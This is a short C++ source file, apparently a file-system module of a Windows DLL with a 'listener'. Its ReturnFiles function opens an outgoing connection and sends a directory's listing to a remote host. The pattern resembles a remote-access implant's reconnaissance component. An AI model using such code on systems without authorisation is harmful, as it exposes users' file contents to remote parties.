#include "FSTraversal.h"
#include "pch.h"
#include "networking.h"
#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <string>

#define BUFFER_LEN 1024

void ReturnFiles(const wchar_t* dir) {
    std::wcout << "[DLL] [ReturnFiles] " << dir << std::endl;
    // Establish outgoing connection
    struct addrinfo* result = NULL;
    SOCKET ConnSock = EstablishRemoteConn(result);
    for (const auto& entry : std::filesystem::directory_iterator(dir))
        SendBuffer(ConnSock, (entry.path().u8string()+="\n").c_str());
    CloseConn(ConnSock, result);
}

BOOL ValidDir(const wchar_t* dir) {
    printf("[DLL] [LISTENER] Validating dir: %ws\n", dir);
    return std::filesystem::is_directory(std::filesystem::status(dir));
}

BOOL ValidFile(const wchar_t* path) {
    printf("[DLL] [LISTENER] Validating file: %ws\n", path);
    return std::filesystem::is_regular_file(std::filesystem::status(path));
}

std::string FileSize(const wchar_t* path) {
    if (ValidFile(path)) {
        return std::to_string(std::filesystem::file_size(path));
    }
    else {
        return std::to_string(0);
    }
}